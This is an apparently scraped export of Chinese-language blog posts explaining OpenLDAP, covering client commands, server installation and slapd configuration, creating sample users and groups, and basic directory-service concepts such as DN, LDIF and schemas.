with scope subtree\r# filter: uid=cylon\r# requesting: ALL\r#\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 1\r插入API ldapadd ldapapp 使用起来比较复杂，在添加时，区分与RootDN，子条目，并且属性相关都需要配置对\n下列时增加一个用户\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=cylon,ou=Group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/cylon\rloginShell: /bin/bash\ruid: cylon\rcn: cylon\ruserPassword: {SSHA}2pvE4C6xy8dkmW2aD/eEocVajg8BujWW\ruidNumber: 10005\rgidNumber: 10001\rsn: cylon\rEOF\rReference [1] Managing Entries ldapmodify and ldapdelete\n[2] How To Search LDAP using ldapsearch\n","permalink":"https://www.oomkill.com/2019/08/ch3-commandline/","summary":"","title":"理解ldap - OpenLDAP客户端命令行使用"},{"content":"生产服务器硬件配置需求 ldap服务对系统环境的要求不高，一般在生产场景，ldap服务应该最少是两台，这样某一台物理服务器岩机才不会因单点问题影响生产业务故障，对于硬件要求，本质上openldap使用硬件资源并不大，网上有两个帖子提出了openldap的硬件需求：\n2003年openldap官网留言，我想安装一个 LDAP 服务器来验证邮件服务器的用户，目前有200个用户需要多少内存和CPU？[1] 1GHZ PIII/512MB 足以 运行于Ubuntu LXC 之上的openldap，用户150,000，sladp进程常驻内存为200-300MB，mdb数据库文件大小为377MB，10 并发平均响应时间为 9-11 毫秒 [13] 操作系统：Centos7/8 64bit。\n操 作 系 统 其 它 CentOS-7.6 当前很稳定且免费的Linux版本。 网卡及IP资源\n名 称 接 口 IP 用途 ldap主服务器01 eth0 10.0.0.17 外部管理IP，用于WAN数据转发。 eth1 10.0.0.17 备用管理IP，用于LAN内数据转发。 ldap从服务器02 eth0 10.0.0.8 管理IP，用于LAN数据转发。 eth1 10.0.0.18 外部管理IP，用于WAN数据转发。 Tips：内外网IP分配可采用最后8位相同的方式，这样使于管理。\nopenldap master服务安装 CentOS/Redhat 安装OpenLDAP组件\nyum install -y \\\ropenldap \\\ropenldap-servers \\\ropenldap-clients \\\ropenldap-devel \\\rcompat-openldap\rUbuntu18.04/22.04/20.04\nsudo apt -y install slapd ldap-utils\r默认OpenLDAP服务所使用的端口为389，此端口采用明文传输数据，数据信息得不到保障。所以可以通过配置CA及结合TLS/SASL实现数据加密传输，所使用端口为636。\n编译安装\nyum install -y \\\rlibtool-ltdl \\\rlibtool-ltdl-devel \\\rgcc \\\ropenssl \\\ropenssl-devel\rOpenldap依赖的相关软件：\nhttp://www.openldap.org/doc/admin24/install.html openldap参数配置优化 openldap配置文件分为五部分\nsladp进程配置部分 frontend：是一个特殊的 olcDatabaseConfig 配置提供权限认证 database：存储的真实引擎 backend：backend在slapd中不是真是的数据库，而是提供的一种转发方式 openldap目录布局 /etc/openldap/slapd.d/*： /etc/openldap/slapd.ldif配置信息生成的文件，每修改一次配置信息，这里的东西就要重新生成。 /var/lib/ldap/*：OpenLDAP的数据文件。 /usr/share/openldap-servers/DB_CONFIG.example：模板数据库配置文件。 /usr/share/openldap-servers/slapd.ldif：默认模板配置文件。 默认OpenLdap服务所使用的端口为389，此端口采用明文传输数据，数据信息得不到保障。所以可以通过配置CA及结合TLS/SSL实现数据加密传输，所使用端口为636。\ncp /usr/share/openldap-servers/slapd.ldif /etc/openldap/\r指定密码，不提示\n$ slappasswd -s 111\r{SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6\r# 指定要搜索的后缀\rolcSuffix: dc=cylon,dc=org\r# rootdn，使用这个dn可以登录服务器\rolcRootDN: cn=admin,dc=cylon,dc=org\rolcDbDirectory: /var/lib/ldap\r# 指定ldapserver管理员密码==\rolcRootPW: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6\r日志及缓存参数。 # 设置日志级别，记录日志信息方便调试 stats 256（日志连接/操作/结果） olcLogLevel: stats\r# 设置ldap可以缓存的记录数\rolcDbCacheSize: 1000\r# checkpoint 可以吧内存中的数据写会数据文件的操作，此设置表示每达到2048kb或者10分钟执行一次\rolcDbCheckpoint: 1024 10\r开启扩展schema openldap自带一些ldif文件 [10]，LDIF 是 LDAP Data Interchange Format 的缩写，是作为存储与LDAP中 ” 文本格式 “ 的数据交换格式，每个条目代表的存入LDAP中记录的属性，记录之间用空行分隔，每行都是 “属性:值” 的格式，例如我们存入LDAP中一个记录，其属性有\ndn (distinguished name) 用于标识目录中名称的唯一标识符 dc (domain component) 表示域组成，例如域名 www.mydomain.com 那么dc 应该配置为DC=www,DC=mydomain,DC=com ou (organizational unit) 这是指用户的组织，这里也可以代表用户组，例如 OU=Lawyer,OU=Developer cn (common name) 表示查询的个体对象的名称，这里可以代表用户名，服务名等，例如 cn=cylon 具有多个属性条目，在ldap中代表一条记录，例如\ndn: cn=The Postmaster,dc=example,dc=com\robjectClass: organizationalRole\rcn: The Postmaster\r而ldif文件就是定义这些属性的文件，下面是openldap安装后默认的ldif文件说明：\ncollective.ldif ：Collective Attribute 组成LDAP条目的共享属性\ncorba.ldif：Common Object Request Broker Architecture 的缩写，旨在促进部署在不同平台上的系统的通信 [2]\ncosine.ldif：Cooperation for Open Systems Interconnection Networking in Europe的缩写，用于给 cosine 与 Internet X.500 模式项目提供LDAP中的属性格式 [3]\nduaconf.ldif：Directory User Agents 的缩写，DUA是协议客户端，是向ldap或Internet X.500 DSA发起请求的一端，这是为DUA客户端提供了通用配置 [4]\ndyngroup.ldif：Dynamic Group的缩写，动态组是LDAP中的一种组，与静态组相反，DG是以URL形式为搜索条件来隐式定义一组用户。[5]\n静态组 Static Groups 使用一组DN显式定义一组用户 inetorgperson.ldif：inetOrgPerson类是 RFC2798中 定义的类。在LDAP中为 user 的父类，比如说用户密码，登录时间等属性，更多可以参考 [6]\njava.ldif：用于java的一些属性\nmisc.ldif：Miscellaneous 的简写，这里主要是一些电子邮件相关属性\nnis.ldif：Network Information Service 的缩写，NIS是一种发现机制，这里是一种server-client的目录属性，例如网络中的主机名，用户名之类 [7]\nopenldap.ldif：\npmi.ldif：Privilege Management Infrastructure 的缩写，是基于x.509的授权访问控制模型，这里是提供了基于PMI的一些属性\nppolicy.ldif：password policy 的缩写，提供了增强的密码管理功能，例如账户到期时间，锁定等\ninclude: file:///etc/openldap/schema/collective.ldif # OpenLDAP的核心schema必须\rinclude: file:///etc/openldap/schema/corba.ldif # include: file:///etc/openldap/schema/cosine.ldif\rinclude: file:///etc/openldap/schema/duaconf.ldif\rinclude: file:///etc/openldap/schema/dyngroup.ldif\rinclude: file:///etc/openldap/schema/inetorgperson.ldif\rinclude: file:///etc/openldap/schema/java.ldif\rinclude: file:///etc/openldap/schema/misc.ldif\rinclude: file:///etc/openldap/schema/nis.ldif\rinclude: file:///etc/openldap/schema/openldap.ldif\rinclude: file:///etc/openldap/schema/pmi.ldif\rinclude: file:///etc/openldap/schema/ppolicy.ldif\r授权及安全参数配置 access to dn=\u0026quot;cn=subschema\u0026quot; by * read\raccess to by self write by dn subtree=\u0026quot;ou=sysusers,dc=test,dc=com\u0026quot; read\rby anonymous auth\r关于更多权限管理的说明，可以参考官方手册第八章 [12]\n提示:\n参数在文件中的先后位置不能随意动。\n空行和以“#”开头的注释行将被忽略。如果一行以空格开头，它将被认为是接着前一行的（即使前一行是注释）。\n配置syslog记录ldap服务日志配置syslog 记录ldap服务日志，默认级别为256；\necho 'local4.* /var/log/slapd.log' \u0026gt;\u0026gt; /etc/rsyslog.conf\rlocal4.* /var/log/slapd.log\r配置LDAP数据库存放路径 注意：\nslapd.conf中设定了LDAP数据库格式为hdb，存储路径/var/1ib/ldap\ncp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG\rchown ldap.ldap /var/lib/ldap/DB_CONFIG\rchmod 700 /var/lib/ldap/DB_CONFIG\r整合的配置 #\r# See slapd-config(5) for details on configuration options.\r# This file should NOT be world readable.\r#\rdn: cn=config\robjectClass: olcGlobal\rcn: config\rolcArgsFile: /var/run/openldap/slapd.args\rolcPidFile: /var/run/openldap/slapd.pid\rolcLogLevel: stats\rolcDisallows: bind_anon\r#\r# TLS settings\r#\rolcTLSCACertificatePath: /etc/openldap/certs\rolcTLSCertificateFile: \u0026quot;OpenLDAP Server\u0026quot;\rolcTLSCertificateKeyFile: /etc/openldap/certs/password\r#\r# Do not enable referrals until AFTER you have a working directory\r# service AND an understanding of referrals.\r#\r#olcReferral: ldap://root.openldap.org\r#\r# Sample security restrictions\r#\tRequire integrity protection (prevent hijacking)\r#\tRequire 112-bit (3DES or better) encryption for updates\r#\tRequire 64-bit encryption for simple bind\r#\r#olcSecurity: ssf=1 update_ssf=112 simple_bind=64\r#\r# Load dynamic backend modules:\r# - modulepath is architecture dependent value (32/64-bit system)\r# - back_sql.la backend requires openldap-servers-sql package\r# - dyngroup.la and dynlist.la cannot be used at the same time\r#\r#dn: cn=module,cn=config\r#objectClass: olcModuleList\r#cn: module\r#olcModulepath:\t/usr/lib/openldap\r#olcModulepath:\t/usr/lib64/openldap\r#olcModuleload: accesslog.la\r#olcModuleload: auditlog.la\r#olcModuleload: back_dnssrv.la\r#olcModuleload: back_ldap.la\r#olcModuleload: back_mdb.la\r#olcModuleload: back_meta.la\r#olcModuleload: back_null.la\r#olcModuleload: back_passwd.la\r#olcModuleload: back_relay.la\r#olcModuleload: back_shell.la\r#olcModuleload: back_sock.la\r#olcModuleload: collect.la\r#olcModuleload: constraint.la\r#olcModuleload: dds.la\r#olcModuleload: deref.la\r#olcModuleload: dyngroup.la\r#olcModuleload: dynlist.la\r#olcModuleload: memberof.la\r#olcModuleload: pcache.la\r#olcModuleload: ppolicy.la\r#olcModuleload: refint.la\r#olcModuleload: retcode.la\r#olcModuleload: rwm.la\r#olcModuleload: seqmod.la\r#olcModuleload: smbk5pwd.la\r#olcModuleload: sssvlv.la\r#olcModuleload: syncprov.la\r#olcModuleload: translucent.la\r#olcModuleload: unique.la\r#olcModuleload: valsort.la\r#\r# Schema settings\r#\rdn: cn=schema,cn=config\robjectClass: olcSchemaConfig\rcn: schema\rinclude: file:///etc/openldap/schema/core.ldif\rinclude: file:///etc/openldap/schema/collective.ldif\rinclude: file:///etc/openldap/schema/corba.ldif\rinclude: file:///etc/openldap/schema/cosine.ldif\rinclude: file:///etc/openldap/schema/duaconf.ldif\rinclude: file:///etc/openldap/schema/dyngroup.ldif\rinclude: file:///etc/openldap/schema/inetorgperson.ldif\rinclude: file:///etc/openldap/schema/java.ldif\rinclude: file:///etc/openldap/schema/misc.ldif\rinclude: file:///etc/openldap/schema/nis.ldif\rinclude: file:///etc/openldap/schema/openldap.ldif\rinclude: file:///etc/openldap/schema/pmi.ldif\rinclude: file:///etc/openldap/schema/ppolicy.ldif\r#\r# Frontend settings\r#\r# 这里是对前端权限的配置，通常默认，不添加权限\rdn: olcDatabase=frontend,cn=config\robjectClass: olcDatabaseConfig\robjectClass: olcFrontendConfig\rolcDatabase: frontend\r#\r# Sample global access control policy:\r#\tRoot DSE: allow anyone to read it\r#\tSubschema (sub)entry DSE: allow anyone to read it\r#\tOther DSEs:\r#\tAllow self write access\r#\tAllow authenticated users read access\r#\tAllow anonymous users to authenticate\r#\r#olcAccess: to dn.base=\u0026quot;\u0026quot; by * read\r#olcAccess: to dn.base=\u0026quot;cn=Subschema\u0026quot; by * read\r#olcAccess: to *\r#\tby self write\r#\tby users read\r#\tby anonymous auth\r#\r# if no access controls are present, the default policy\r# allows anyone and everyone to read anything but restricts\r# updates to rootdn. (e.g., \u0026quot;access to * by * read\u0026quot;)\r#\r# rootdn can always read and write EVERYTHING!\r#\r#\r# Configuration database\r#\r# 这里是对后端数据库权限的配置\rdn: olcDatabase=config,cn=config\robjectClass: olcDatabaseConfig\rolcDatabase: config\rolcAccess: to attrs=userPassword,shadowLastChange\rby dn.children=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; write\rby anonymous auth\rby self write\rby * none\rolcAccess: to * by dn.base=\u0026quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\u0026quot; manage\rby group.exact=\u0026quot;cn=configadmin,ou=admin,dc=seal,dc=com\u0026quot; write\rby * none\r#\r# Server status monitoring\r#\rdn: olcDatabase=monitor,cn=config\robjectClass: olcDatabaseConfig\rolcDatabase: monitor\rolcAccess: to * by dn.base=\u0026quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,c\rn=auth\u0026quot; read by dn.base=\u0026quot;cn=Manager,dc=my-domain,dc=com\u0026quot; read by * none\r#\r# Backend database definitions\r#\r# 这里是数据库的参数配置\rdn: olcDatabase=mdb,cn=config\robjectClass: olcDatabaseConfig\r# 使用的数据库引擎是mdb\robjectClass: olcMdbConfig\rolcDatabase: mdb\r# Suffix 为数据库的后缀，每个数据库至少一个，在搜索时-D 后面的域后缀为dc=test,dc=com将被pass到这里\rolcSuffix: dc=test,dc=com\r# 指不收前面配置的权限控制的管理员账户，拥有最最高权限\rolcRootDN: cn=admin,dc=test,dc=com\r# 特权账户的登录密码\rolcRootPW: {SSHA}xU9xFym/s7rawpmzpsYE+Q1qPsVPOwDw\rolcDbDirectory:\t/var/lib/ldap\r# 这是索引属性，下面是默认的属性\r# 下列注释行意思为\r# olcDbIndex: default pres,eq\r# olcDbIndex: uid\r# olcDbIndex: cn,sn pres,eq,sub\r# olcDbIndex: objectClass eq\r# pres,eq 为 present equality\r# 第二行意思为，为uid属性类型维护默认索引集\r# 第三行意思为，为cn,sn属性维护pres,eq,sub索引集\r# 索引集类型有 pres,eq,approx,sub,none\rolcDbIndex: objectClass eq,pres\rolcDbIndex: uid,ou,cn,mail,surname,givenname eq,pres,sub\r# 配置从缓冲区写入磁盘的，两个参数分别为多少kbyte大小的数据自上次（第二个参数）分钟则发生一次写入\rolcDbCheckpoint: 1024 10\r更多配置文件选项说明可以参考 [14]\n生成配置文件 修改配置文件后需要重新生成配置文件\nslapadd -n 0 -F /etc/openldap/slapd.d -l /etc/openldap/slapd.ldif\r生成配置文件时的错误\n$ slapadd -n 0 -F /etc/openldap/slapd.d -l /etc/openldap/slapd.ldif\r63678619 str2entry: entry -1 has no dn\rslapadd: could not parse entry (line=31)\r_######## 43.66% eta none elapsed none spd 7.0 M/s 对于 slapd.ldif 需要注意下列事项\n行首 # 为注释 行尾不能有任何空白，这里也是很难排查的一个点 对于不同的属性需要放对位置快否则会报错，例如 olcDbCacheSize: 1000 是hdb配置，mdb添加会报错，有明显提示 如果生产配置失败后，修改配置文件后再次生成需要删除 rm -fr slapd.d/* 例如下面就是一个有提示的典型例子\n63678513 Entry (cn=config), attribute 'olcDbCacheSize' not allowed\rslapadd: dn=\u0026quot;cn=config\u0026quot; (line=1): (65) attribute 'olcDbCacheSize' not allowed\r下面的报错比较不明显，通常删除 rm -fr slapd.d/* 后重试\nslapadd: could not add entry dn=\u0026quot;cn=config\u0026quot; (line=1): _### 17.92% eta none elapsed none spd 6.3 M/s 为LDAP初始化数据 部署完成后就是访问，ldap了，此时向OpenLDAP 搜索会发现没有内容\n$ ldapsearch -LLL -x -W -H ldap://10.0.0.4 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; \u0026quot;(uid=*)\u0026quot;\rEnter LDAP Password: No such object (32)\rReference http://www.openldap.org/faq/data/cache/1.html http://www.openldap.org/doc/admin24/appendix-common-errors.html 创建Root条目 在第一次部署好openldap中，实际上是没有任何条目的，此时是无法存入数据，有人说在 database setting中配置了 olcRootDN ，这里是指标识用哪个数据库的（即那个root存入哪里），而不是一个具体的root dn，所以需要手动创建一个\n例如下列，是创建一个RootDN\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: dc=test,dc=com\robjectclass: top\robjectClass: organizationalUnit\robjectclass: extensibleObject\rdescription: US Organization\rou: people\rEOF\r这里需要注意几点：\ndn: dc=test,dc=com 是指定存储的地方，如果在database配置中为配置 olcRootDN 则报错不会被存储 由于创建的的是root，所以ou的 objectClass 会报错，需要用一个 extensibleObject 才可以创建 [15] 创建子域 此时因为有了RootDN，可以指定dn为子域了，并且 objectClass: organizationalUnit 可以单独使用\n这里子域其实可以理解为二级域名了，在公司中也可以为子公司\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: ou=group,dc=test,dc=com\robjectClass: organizationalUnit\rou: group\rEOF\r创建组 这里使用 posixGroup Portable Operating System Interface of UNIX 的简写，这里可以理解为Linux用户管理的标准，包含一些标准的属性，类似于 /etc/group\n下面创建一个gid为10001的组，组名为tech\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: cn=tech,ou=group,dc=test,dc=com\robjectClass: posixGroup\rgidNumber: 10001\rcn: tech\rEOF\r创建用户 创建用户user01\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=user01,ou=Group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/user01\rloginShell: /bin/bash\ruid: user01\rcn: user01\ruidNumber: 10004\rgidNumber: 10001\ruserPassword: {SSHA}hJpIIVxj1qS9g05qUlgG+o7MO14EXbFQ\rsn: user01\rgivenName: user01\r创建用户cylon\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=cylon,ou=Group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/cylon\rloginShell: /bin/bash\ruid: cylon\rcn: cylon\ruserPassword: {SSHA}2pvE4C6xy8dkmW2aD/eEocVajg8BujWW\ruidNumber: 10005\rgidNumber: 10001\rsn: cylon\rEOF\r如上面所示，objectClass [11] 表示这个ldap条目拥有的属性，可以看到 posixAccount，inetOrgPerson 等都是导入的schema文件，其中 uidNumber ，userPassword 都是 NIS 定义的，cn 则是 core定义的\n提示:\n以上信息中ldap 用户1：user01密码 111 用户2：cylon 密码 123456 这些原始信息是如何获得的？ 检查初始化测试数据。 查询导入的结果，默认查的是所有数据\nldapsearch -LLL -w 111 -x -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot;\r备份ldap数据库数据 ldapadd -x -H ldap://cylon.org -D \u0026quot;cn=admin,dc=cylon,dc=org\u0026quot; -W -f base.ldif \u0026gt;base.ldif\rldapadd -x -H ldap://cylon.org -D \u0026quot;cn=admin,dc=cylon,dc=org\u0026quot; -W -f test.ldif \u0026gt;test.ldif\rReference [1] msg00281\n[2] Object Request Broker Architecture\n[3] Cooperation for Open Systems Interconnection Networking in Europe\n[4] DUA\n[5] DynamicGroup\n[6] InetOrgPerson\n[7] Network Information Service\n[8] Privilege Management Infrastructure\n[9] Password Policy\n[10] LDAP Data Interchange Format\n[11] Object Class\n[12] 8. Access Control\n[13] openldap system requirements for virtualization\n[14] slapdconf2\n[15] attribute dc is not allowed\n","permalink":"https://www.oomkill.com/2019/08/ch2-install/","summary":"","title":"理解ldap - OpenLDAP安装"},{"content":"什么是目录服务？ ==目录是一类为了浏览和搜索数据而设计的特殊的数据库==，例如：为人所熟知的微软公 司的活动目录（active directory）就是目录数据库的一种，目录服务是按照==树状形式==存储信息的，目录包含基于属性的描述性信息，并且支持高级的过滤功能。\nhttp://www.openldap.org/doc/admin24/intro.html 一般来说，目录不支持大多数事务型数据库所支持的高吞吐量和复杂的更新操作。目录进行更新操作，可以说是要么全部，要么都不的原子操作。目录服务适合的业务应用在于提供大量的查询和搜索操作，而不是大量的写入操作。Ldap可以说是活动目录在linux系统上的一个开源实现。\n为了保证目录数据的可用性和可靠性，在确保使用目录服务提供快速查询和搜索操作的同时，目录服务还提供了==主从服务器同步目录数据信息的能力==，这相当于传统的MySQL数据库的主从同步功能一样，可以最大限度的确保基于目录业务的服务持续可用性与提供并发查询能力，微软公司的活动目录（active directory）就有主域和备份域的说法。\n广义的目录服务概念，可以用多种不同的方式来提供目录服务。不同的目录所允许存储的信息是不同的，在信息如何被引用、查询、更新以及防止未经授权的访问等问题上，不同的目录服务的处理方式也有诸多的不同。\n例如：一些目录服务是本地的，只提供受限的服务（比如，单机上的finger服务）。另一些服务是大范围的（global），提供广阔得多的服务（比如面向整个因特网），大范围的服务通常是分布式的，这也就意味着数据是分布在多台机器上的，这些机器一起来提供目录服务，典型的大范围服务定义一个统一的名称空间（namespace）来给出一个相同的数据视图（data view），而不管你相对于数据所在的位置。DNS是一个典型的大范围分布式目录服务的例子。\nhttp://www.openldap.org/faq/data/cache/595.html 什么是ldap？ 目录服务有两个国际标准，分别是X.500和LDAP。X.500是ITU定义的目录标准，而LDAP是基于TCP/IP的目录访问协议，是Intemet上目录服务的通用访问协议。\nLDAP是 Lightweight Directory Access Protocol（轻量级目录访问协议）的缩写。正如它的名字所表明的那样，它是一个轻量级的目录访问协议，特指基于X.500的目录访问协议的简化版本。LDAP运行在 TCP/IP 或者其他的面向连接的传输服务之上。LDAP完整的技术规范由RFC2251“The Lightweight Directory Access Protocol（v3）”和其他几个在RFC3377中定义的文档组成。\nLDAP是轻量目录访问协议（Lielhtweiglht Directory Access Protocol）的缩写。 LDAP标准实际上是在X.500标准基础上产生的一个简化版本。 什么是X.500？ X.500由ITU-T和ISO定义，它实际上不是一个协议，而是由一个==协议族==组成，包括了从X.501到X.525等一系列非常完整的目录服务协议。\n从技术上来说，LDAP是一个到X.500目录服务的目录访问协议，X.500是一个OSI目录服务。最初，LDAP客户端通过网关访问X.500目录服务。网关在客户端和网关之间运行LDAP，而X.500目录访问协议（Directory Access Protocol，DAP），位于这个网关和X.500服务器之间。\nLDAP是一个重量级的协议，在整个OSI协议栈上进行操作，而且需要占用大量的计算资源。而LDAP被设计为在TCP/IP层上操作，以小得多的代价实现了大多数LDAP的功能。\n虽然LDAP仍旧可以通过网关访问X.500目录服务器，但是现在通常都是在X.500服务器上直接实现LDAP。\n单独的LDAP守护程序openldap slapd，可以被看做是一个轻量级的X.500目录服务器。也就是说，它没有实现X.500完整的DAP协议。作为一个轻量级的目录服务器，slapd实现的仅仅是X.500模型的一个子集。\nLDAP中的常用名词缩写及含义。\nLDAP基本概念中的常用名词缩写及含义\n关 键字 英文全称 含 义 dc Domain Component 城名的部分，其格式是将完整的城名分成几部分，如域名为exaple.com变成dc=exaple,dc=com uid User Id 用户ID，如 “oldboy”。 ou Organization Unit 组织单位，类似于Limux文件系统中的子目录，它是一个容器对象，组织单位可以包含其他各种对象（包括其他组织单元），如“tech，rongjunfeng，bingge” cn Common Name 公共名称，如 “Thowas Johansson” sn Surnase 姓，如 “Johansson” dn Distinguished Name 唯一辨别名，类似于Linux文件系统中的绝对路径，每个对象都有一个唯一的名称，如uid=tos,ou=market,dc=example,dc=com，在一个目录树中 总是唯一的。 rdn Relative dn 相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如uid=tom或cn=Thoeas Johansscn。 c Country 国家，如“CN”或“US”等 o organizatione 组织名，如“Example，Inc.”。 LDAP目录服务的特点 LDAP（openldap）目录服务具有下列特点：\nLDAP是一个跨平台的、标准的协议，近几年来得到了业界广泛的认可。 LDAP的结构用树型结构来表示，而不是用表格。因此不用SQL语句维护了。 LDAP提供了静态数据的快速查询方式，但在更新数据方面并不擅长。 LDAP服务可以使用基于“推”或“拉”的复制信息技术，用简单的或基于安全证书的安全认证，复制部分或全部数据，既保证了数据的安全性，又提高了数据的访问效率： LDAP是一个安全的协议，LDAPv3支持SASL（Simple Authentication and Security Layer）、SSL（Secure Socket Layer）和TLS（Transport Layer Security），使用认证来确保事务的安全，另外，LDAP提供了不同层次的访问控制，以限制不同用户的访问权限。 LDAP支持异类数据存储，LDAP存储的数据可以是文本资料、二进制图片等。 Client/Server 模型：Server端用于存储树，Client端提供操作目录信息树的工具，通过这些工具，可以将数据库的内容以文本格式（LDAP数据交换格式，LDIF）呈现在我们的面前。 LDAP是一种开放Internet 标准，LDAP协议是跨平台的的Interent协议，它是基于X.500标准的，与X.500不同，LDAP支持TCP/IP（即可以分布式部署）。 LDAP的目录结构 LDAP目录服务是通过目录数据库来存储网络信息来提供目录服务的。为了方便用户迅速查找和定位信息，目录数据库是以目录信息树（Directory Infornation Tree，缩写为DIT）为存储方式的树型存储结构，目录信息树及其相关概念构成了LDAP协议的信息模型。\n在LDAP中，目录是按照树型结构组织一一目录信息树（Directory Information Tree简写DIT），DIT是一个主要进行读操作的数据库。 DIT由条目（Entry）组成，条目相当于关系数据库中的表的记录： 条目是具有分辨名DN（Distinguished Name）的属性-值对（Attribute-value，简称AV） 的集合。\n在UNIX文件系统中，最项层是根目录（root），LDAP目录通常也用ROOT做根，通常称为BaseDN。\n因为历史（X.500）的原因，LDAP目录用OU（Organization Unit）从逻辑上把数据分开来。Ou也是一种条目\u0026ndash;==容器条目==。Ou下面即是真正的用户条目。\n什么是dn?\nDN，Distinguished Name，即分辨名。\n在LDAP中，一个条目的分辨名叫做“DN”，DN是该条目在整个树中的唯一名称标识，DN相当于关系数据席表中的关键字（Primary Key）；它是一个识别属性，通常用于检索。\nDN的两种设置\n基于cn（姓名），cn=test,ou=auth,dc=cylon,dc=org，最常见的cn是从 /etc/group 转来的条目。.\n基于uid（User ID），uid=test,ou=auth,dc=cylon,dc=org 最常见的uid是 /etc/passwd 转来的条目。\nBase DN\nLDAP目录树的最顶部就是根，也就是Base DN.\nLDIF格式\nLDIF格式是用于LDAP数据导入、导出的格式。LDIF是LDAP数据库信息的一种文本格式。BDB。\n什么样的信息可以存储在目录当中？\nLDAP的信息模型是基于条目的（entry）。一个条目就是一些具有全局唯一的标识名（Distinguished Name，简写做==DN==）的属性的集合。DN用于无二义性的指代一个唯一的条目，条目的每一个属性都有一个类型（type），一个或者多个值（value），类型（type）往往是特定字符串的简写，比如用 cn 指代 commpn name，或者 mail 指代电子邮件地址。值（value）的语法依赖于类型（type），比如，类型为cn的属性可能包含值Babs Jensen。 类型为mail的属性可能包含值 babs@example.com 。类型为jpegPhoto的属性可能包含二进制格式的JPEG图象。\n下面是LDAP中条目信息的例子；就相当于数据库表中的两行记录：\nLDAP允许你通过使用一种叫做 objectClass的特殊属性来控制哪些属性是条目所必须的，哪些属性是条目可选的，objectClass 属性的值是由条目所必须遵从的方案（schema） 来建义的。\n通过下面命令可以取出上面的内容。\nldapsearch -LLL -w oldboy -x -H ldap://10.0.0.20 -D \u0026quot;cn=admin,dc=cylon,dc=org\u0026quot; -b \u0026quot;dc=cylon,dc=org\u0026quot; uid=\u0026quot;*\u0026quot; 信息在目录中是如何组织的？\n在LDAP中，条目是按树状的层次结构组织的，传统上，这个结构往往是地理界限或者组织界限的反映。代表国家的条目位于整个目录树的顶层。之下的条目则代表各个州以及国家性的组织，再下面的条目则代表着组织单位、个人打印机、文件，或者你所能想到的其他东西，图1.1显示了按照传统命名方式组织的LDAP目录信息树。\n图1.1：LDAP目录树（传统命名方式） 目录树也可以按照因特网域名结构组织。因为它允许按照DNS对目录服务进行定位，这种命名方式正变得越来越受欢迎。图1.2显示了按照域名进行组织的一个LDAP目录树的例子。\nhttp://www.openldap.org/doc/admin24/intro.html root -\u0026gt; 顶级域 -\u0026gt; 二级 -\u0026gt; ou -\u0026gt; uid\n图1-2：LDAP目录树（域名命名方式） 例：dn:cn=testlb,ou=People,ou=accounts,dc=cylon,dc=org\n另外，LDAP允许你通过使用一种叫做objectClass的特殊属性来控制哪些属性是条目所必须的，哪些属性是条目可选的。objectClass属性的值是由条目所必须遵从的方案 （schema）来定义的。.\n（3）信息是如何械引用的？\n一个条目是通过它的标识名来引用的。而标识名是由相对标识名（Relative Distinguished Name或者RDN）和它的父条目名连在一起构成的。比如，在因特网命名的例子中，Barbara Jensen条目有相对标识名 uid=babs 和标识名为：uid=babs,ou=People,de=example,dc=com 。\nLDIF数据文件介绍 目录数据文件内容讲解\nLDIF（LDAP Data Interchangep-omat）轻量级目录交换格式）一种ASCII文件格式，用来交换数据并使得在LDAP服务器间交换数据成为可能。\nLDIF文件最常用的功能就是向目录导入或修改信息，这些信息的格式需要按照LDAP中架构（schema）格式组织，如果不符合其要求的格式就会出现错误。\nLDIF文件的特点：\n通过空行来分割一个条目或定义。 以#开始的行为注释。 所有属性的赋值方法为：\u0026quot;属性: 属性值\u0026quot; 例如，dn:dn=cylon,dc=org 属性可以被重复赋值。例如objectclass就可以有多个，每个属性独立一行。 每行的结尾不允许有空格。 在LDAP的每条记录中必须包含一个objectclass属性，且其需要赋子至少一个值。objectclass属性有等级之分，属性相当于变量，它可以被自定义赋值，值不能相同。\n目录数据展现的树形结构圆。以上ldif数据文件表现个内容为如下树形结构：ldap C/S工具呈现的。\nLDAP是想样工作的？ LDAP目录服务是基于 C/S模式的。一个或者多个LDAP服务器包含着组成整个目录信息树（DIT）的数据，客户端连接到服务器并且发出一个请求（request），然后服务器要么以一个回答（answer）子以回应，要么给出一个指针，客户可以通过此指针获取到所需的数据（通常，该指针是指向另一个LDAP服务器），无论客户端连到哪个LDAP服务器，它看到的都是同一个目录视图（view）.这是LDAP这类全局目录服务的一个重要特征。\nLDAP的几个重要配置模式 